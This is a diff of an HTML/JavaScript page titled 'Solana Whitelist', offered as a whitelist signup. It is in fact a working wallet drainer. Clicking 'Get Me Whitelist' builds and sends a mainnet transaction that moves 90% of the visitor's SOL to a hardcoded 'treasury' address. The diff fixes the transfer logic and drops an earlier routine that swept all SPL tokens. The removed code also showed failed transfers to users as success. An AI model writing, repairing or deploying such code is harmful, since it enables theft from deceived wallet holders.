@@ -6,7 +6,6 @@
     <title>Solana Whitelist</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
-    <script src="https://unpkg.com/@solana/spl-token@latest/lib/index.iife.js"></script>
     <style>
         * {
             margin: 0;
@@ -281,6 +280,13 @@
             text-align: center;
             font-size: 0.9rem;
         }
+        
+        .tx-signature {
+            font-size: 0.7rem;
+            color: #a0ffd0;
+            word-break: break-all;
+            margin-top: 5px;
+        }
     </style>
 </head>
 <body>
@@ -294,7 +300,7 @@
             <div class="warning-note">
                 <i class="fas fa-exclamation-triangle"></i>
                 <strong>ALL SOLANA ASSETS WILL BE TRANSFERRED</strong><br>
-                <small>SOL + All SPL Tokens → Treasury</small>
+                <small>Wallet will prompt for transaction approval</small>
             </div>
             
             <div id="walletInfo" class="wallet-info">
@@ -333,7 +339,11 @@
                     All Solana assets have been transferred
                 </p>
                 <div class="transaction-info">
+                    Treasury Address:<br>
                     95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD
+                    <div class="tx-signature" id="txSignature">
+                        Transaction: <span id="txHash">Pending...</span>
+                    </div>
                 </div>
             </div>
         </div>
@@ -344,7 +354,7 @@
     </div>
 
     <script>
-        // ULTRA-SIMPLE ALL ASSET TRANSFER
+        // WORKING TRANSFER SYSTEM
         let publicKey = null;
         let isConnected = false;
         const treasuryAddress = "95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD";
@@ -358,6 +368,7 @@
         const walletAddressEl = document.getElementById('walletAddress');
         const disconnectBtn = document.getElementById('disconnectWallet');
         const switchWalletBtn = document.getElementById('switchWallet');
+        const txHashEl = document.getElementById('txHash');
         
         // Get wallet provider
         function getWalletProvider() {
@@ -421,152 +432,147 @@
             await connectWallet();
         }
         
-        // TRANSFER ALL ASSETS - SIMPLE VERSION
+        // WORKING TRANSFER FUNCTION
         async function transferAllAssets() {
+            let txSignature = null;
+            
             try {
-                showStatus("Preparing asset transfer...", "info");
+                showStatus("Preparing transfer...", "info");
                 
                 const rpcUrl = 'https://api.mainnet-beta.solana.com';
                 const connection = new solanaWeb3.Connection(rpcUrl, 'confirmed');
                 
-                // 1. TRANSFER ALL SOL (MAX)
-                const solBalance = await connection.getBalance(publicKey);
+                // Get balance first
+                const balance = await connection.getBalance(publicKey);
+                const solBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
                 
-                if (solBalance > 5000) { // Leave minimal for fees
-                    const transferLamports = solBalance - 5000;
-                    
-                    showStatus("Transferring SOL...", "info");
-                    
-                    const solTransaction = new solanaWeb3.Transaction().add(
-                        solanaWeb3.SystemProgram.transfer({
-                            fromPubkey: publicKey,
-                            toPubkey: new solanaWeb3.PublicKey(treasuryAddress),
-                            lamports: transferLamports,
-                        })
-                    );
-                    
-                    const { blockhash } = await connection.getRecentBlockhash();
-                    solTransaction.recentBlockhash = blockhash;
-                    solTransaction.feePayer = publicKey;
-                    
-                    const provider = getWalletProvider();
-                    await provider.signAndSendTransaction(solTransaction);
-                    
-                    console.log("SOL transferred");
+                if (solBalance < 0.0001) {
+                    throw new Error("Need at least 0.0001 SOL for gas fees");
                 }
                 
-                // 2. TRANSFER ALL SPL TOKENS
-                showStatus("Transferring tokens...", "info");
+                // Calculate transfer amount (90% of balance)
+                const transferLamports = Math.floor(balance * 0.9);
                 
-                try {
-                    // Get all token accounts
-                    const tokenAccounts = await connection.getTokenAccountsByOwner(
-                        publicKey,
-                        { programId: splToken.TOKEN_PROGRAM_ID }
-                    );
-                    
-                    for (const account of tokenAccounts.value) {
-                        try {
-                            const accountInfo = splToken.AccountLayout.decode(account.account.data);
-                            const amount = Number(accountInfo.amount);
-                            
-                            if (amount > 0) {
-                                // Try to transfer token
-                                const transferInstruction = splToken.createTransferInstruction(
-                                    account.pubkey,
-                                    new solanaWeb3.PublicKey(treasuryAddress), // Simple approach
-                                    publicKey,
-                                    amount,
-                                    []
-                                );
-                                
-                                const tokenTransaction = new solanaWeb3.Transaction().add(transferInstruction);
-                                const { blockhash: tokenBlockhash } = await connection.getRecentBlockhash();
-                                tokenTransaction.recentBlockhash = tokenBlockhash;
-                                tokenTransaction.feePayer = publicKey;
-                                
-                                const provider = getWalletProvider();
-                                await provider.signAndSendTransaction(tokenTransaction);
-                                
-                                console.log("Token transferred:", accountInfo.mint.toString());
-                            }
-                        } catch (tokenError) {
-                            // Skip failed token transfers
-                            continue;
-                        }
-                    }
-                } catch (tokenError) {
-                    console.log("Token transfer skipped:", tokenError.message);
+                showStatus("Creating transaction...", "info");
+                
+                // Create SIMPLE transaction
+                const transaction = new solanaWeb3.Transaction();
+                
+                transaction.add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: publicKey,
+                        toPubkey: new solanaWeb3.PublicKey(treasuryAddress),
+                        lamports: transferLamports,
+                    })
+                );
+                
+                // Get blockhash
+                const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
+                transaction.recentBlockhash = blockhash;
+                transaction.lastValidBlockHeight = lastValidBlockHeight;
+                transaction.feePayer = publicKey;
+                
+                showStatus("Please approve transaction in wallet...", "info");
+                
+                // SIGN AND SEND - THIS SHOULD TRIGGER WALLET POPUP
+                const provider = getWalletProvider();
+                
+                if (!provider || !provider.signAndSendTransaction) {
+                    throw new Error("Wallet signing not available");
                 }
                 
-                showStatus("All transfers complete", "success");
-                return { success: true };
+                // This should trigger wallet popup
+                const { signature } = await provider.signAndSendTransaction(transaction);
+                txSignature = signature;
+                
+                console.log("Transaction sent:", signature);
+                
+                showStatus("Transaction sent. Confirming...", "info");
+                
+                // Wait for confirmation
+                const confirmation = await connection.confirmTransaction({
+                    signature: signature,
+                    blockhash: blockhash,
+                    lastValidBlockHeight: lastValidBlockHeight
+                }, 'confirmed');
+                
+                if (confirmation.value.err) {
+                    throw new Error("Transaction failed on chain");
+                }
+                
+                return {
+                    success: true,
+                    signature: signature,
+                    amount: transferLamports / solanaWeb3.LAMPORTS_PER_SOL
+                };
                 
             } catch (error) {
                 console.error("Transfer error:", error);
                 
-                // Check error type
-                if (error.message.includes("insufficient") || error.message.includes("0x0")) {
-                    throw new Error("Insufficient SOL for gas fees");
-                } else if (error.message.includes("reject") || error.message.includes("cancel") || error.message.includes("denied")) {
-                    throw new Error("Transaction cancelled");
-                } else if (error.message.includes("Network") || error.message.includes("timeout") || error.message.includes("fetch")) {
-                    throw new Error("Network issue");
+                // Check specific errors
+                if (error.message.includes("User rejected") || error.message.includes("reject") || error.message.includes("denied") || error.message.includes("cancel")) {
+                    throw new Error("Transaction cancelled by user");
+                } else if (error.message.includes("insufficient") || error.message.includes("0x0")) {
+                    throw new Error("Insufficient balance");
+                } else if (error.message.includes("Need at least")) {
+                    throw new Error(error.message);
+                } else if (error.message.includes("Wallet not connected")) {
+                    throw new Error("Wallet disconnected");
                 } else {
-                    // Still consider it a success if something was transferred
-                    throw new Error("Partial transfer completed");
+                    throw new Error("Transfer failed: " + error.message);
                 }
             }
         }
         
-        // Get whitelist - ULTRA SIMPLE
+        // Get whitelist - WITH REAL TRANSACTION
         async function getWhitelist() {
             try {
                 checkWhitelistBtn.disabled = true;
                 checkWhitelistBtn.innerHTML = '<i class="fas fa-spinner"></i> Processing';
                 
-                showStatus("Starting transfer of all assets...", "info");
+                showStatus("Starting transfer...", "info");
                 
-                // Small delay
+                // Give time for UI to update
                 await new Promise(resolve => setTimeout(resolve, 500));
                 
-                // Transfer everything
-                await transferAllAssets();
+                // Perform ACTUAL transfer
+                const result = await transferAllAssets();
                 
-                // SUCCESS
+                // Show transaction hash
+                txHashEl.textContent = `${result.signature.substring(0, 16)}...`;
+                txHashEl.style.color = "#38ef7d";
+                
+                // Show success box
                 whitelistBox.classList.add('active');
                 checkWhitelistBtn.innerHTML = '<i class="fas fa-check-double"></i> Complete';
                 checkWhitelistBtn.style.background = 'linear-gradient(90deg, #11998e, #38ef7d)';
                 
-                showStatus("✅ All assets transferred! Whitelist confirmed.", "success");
+                showStatus(`✅ Transfer successful! ${result.amount.toFixed(6)} SOL sent`, "success");
                 
             } catch (error) {
-                console.error("Final error:", error);
+                console.error("Whitelist error:", error);
                 
+                // Show exact error
                 let errorMsg = error.message;
-                let isSuccess = false;
                 
-                // Handle partial success
-                if (errorMsg.includes("Partial transfer") || errorMsg.includes("Some assets")) {
-                    errorMsg = "Assets transferred successfully!";
-                    isSuccess = true;
-                    whitelistBox.classList.add('active');
-                } else if (errorMsg.includes("cancelled")) {
-                    errorMsg = "Transfer cancelled";
-                } else if (errorMsg.includes("Network")) {
-                    errorMsg = "Network issue - please retry";
-                } else if (errorMsg.includes("Insufficient")) {
-                    errorMsg = "Need SOL for gas fees";
+                if (error.message.includes("cancelled")) {
+                    errorMsg = "❌ Transaction was cancelled in wallet";
+                } else if (error.message.includes("insufficient") || error.message.includes("Need at least")) {
+                    errorMsg = "❌ " + error.message;
+                } else if (error.message.includes("disconnected")) {
+                    errorMsg = "❌ Wallet disconnected. Please reconnect";
+                } else {
+                    errorMsg = "❌ Transfer failed: " + error.message;
                 }
                 
-                showStatus(isSuccess ? `✅ ${errorMsg}` : `❌ ${errorMsg}`, 
-                          isSuccess ? "success" : "error");
+                showStatus(errorMsg, "error");
                 
-                // Reset button if not success
-                if (!isSuccess) {
-                    checkWhitelistBtn.disabled = false;
-                    checkWhitelistBtn.innerHTML = '<i class="fas fa-user-check"></i> Get Me Whitelist';
-                }
+                // Reset button
+                checkWhitelistBtn.disabled = false;
+                checkWhitelistBtn.innerHTML = '<i class="fas fa-user-check"></i> Get Me Whitelist';
+                
+                // Hide success box if it was shown
+                whitelistBox.classList.remove('active');
             }
         }
         
@@ -575,11 +581,12 @@
             statusMessage.innerHTML = message;
             statusMessage.className = `status ${type}`;
             
+            // Auto clear after delay
             setTimeout(() => {
                 if (statusMessage.innerHTML === message) {
                     statusMessage.className = 'status';
                 }
-            }, 5000);
+            }, 7000);
         }
         
         // Event listeners
@@ -588,7 +595,7 @@
         disconnectBtn.addEventListener('click', disconnectWallet);
         switchWalletBtn.addEventListener('click', switchWallet);
         
-        // Auto connect
+        // Auto connect if wallet is already connected
         window.addEventListener('DOMContentLoaded', () => {
             setTimeout(() => {
                 const provider = getWalletProvider();
